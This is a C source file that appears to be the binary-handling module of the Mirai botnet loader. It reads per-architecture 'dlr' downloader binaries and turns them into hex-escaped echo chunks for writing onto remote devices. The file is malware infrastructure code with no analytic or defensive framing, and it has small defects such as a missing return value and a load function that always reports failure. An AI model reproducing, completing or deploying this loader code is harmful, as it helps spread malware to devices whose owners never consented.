#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <glob.h>

#include "headers/includes.h"
#include "headers/binary.h"

static int bin_list_len = 0;
static struct binary **bin_list = NULL;

BOOL binary_init(void)
{
    glob_t pglob;
    int i = 0;

    if(glob("bins/dlr.*", GLOB_ERR, NULL, &pglob) != 0)
    {
        //printf("Failed to load from bins folder!\n");
        return;
    }

    for(i = 0; i < pglob.gl_pathc; i++)
    {
        char file_name[256];
        struct binary *bin;

        bin_list = realloc(bin_list, (bin_list_len + 1) * sizeof(struct binary *));
        bin_list[bin_list_len] = calloc(1, sizeof(struct binary));
        bin = bin_list[bin_list_len++];

        #ifdef DEBUG
            //printf("(%d/%d) %s is loading...\n", i + 1, pglob.gl_pathc, pglob.gl_pathv[i]);
        #endif
        strcpy(file_name, pglob.gl_pathv[i]);
        strtok(file_name, ".");
        strcpy(bin->arch, strtok(NULL, "."));
        load(bin, pglob.gl_pathv[i]);
    }

    globfree(&pglob);
    return TRUE;
}

struct binary *binary_get_by_arch(char *arch, int len)
{
    int i = 0;

    for(i = 0; i < bin_list_len; i++)
    {
        if(strncmp(arch, bin_list[i]->arch, len) == 0)
        {
            #ifdef DEBUG
                printf("Compared arch %s with %s\n", arch, bin_list[i]->arch);
            #endif
            return bin_list[i];
        }
    }

    return NULL;
}

static BOOL load(struct binary *bin, char *fname)
{
    FILE *file;
    char rdbuf[BINARY_BYTES_PER_ECHOLINE];
    int n = 0;

    if((file = fopen(fname, "r")) == NULL)
    {
        //printf("Failed to open %s forparsing\n", fname);
        return FALSE;
    }

    while((n = fread(rdbuf, sizeof(char), BINARY_BYTES_PER_ECHOLINE, file)) != 0)
    {
        char *ptr;
        int i = 0;

        bin->hex_payloads = realloc(bin->hex_payloads, (bin->hex_payloads_len + 1) * sizeof(char *));
        bin->hex_payloads[bin->hex_payloads_len] = calloc(sizeof(char), (4 * n) + 8);
        ptr = bin->hex_payloads[bin->hex_payloads_len++];

        for(i = 0; i < n; i++)
            ptr += sprintf(ptr, "\\x%02x", (uint8_t)rdbuf[i]);
    }

    return FALSE;
}
